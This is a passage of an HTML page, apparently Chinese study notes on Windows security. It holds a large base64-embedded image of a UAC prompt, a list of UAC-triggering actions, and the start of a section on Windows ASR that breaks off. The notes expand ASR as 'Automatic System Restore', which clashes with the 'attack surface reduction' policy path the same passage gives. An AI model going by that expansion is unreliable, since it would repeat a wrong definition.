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" alt="Do you want to allow this app to make  changes to your device?  Procexp  Verified publisher. Microsoft Corporation  File Hard drive on this computer  Show more "></p><p>​                触发UAC的操作</p><p>​                        Windows更新、增加/删除用户、更改账户类型、安装/删除程序、安装驱动、设置家长控制。。。</p><h2 id="8-Windows-ASR（win-10-1709-、win-2016以上）"><a href="#8-Windows-ASR（win-10-1709-、win-2016以上）" class="headerlink" title="8.Windows ASR（win 10 1709 、win 2016以上）"></a>8.Windows ASR（win 10 1709 、win 2016以上）</h2><p>​                Automatic System Restore ——自动系统恢复</p><p>​                通过配置规则，防止电脑被攻击</p><p>​                常用防止攻击方式</p><p>​                        office钓鱼、usb、驱动下载攻击、apk攻击</p><p>​                打开方式</p><p>​                        Gpedit.msc组策略编辑器-&gt;计算机设置-&gt;管理模板-&gt;windows组件-&gt;windows defender-&gt;攻击防护-&gt;ASR攻击面减少</p><p>​                asr规则</p><p>​                    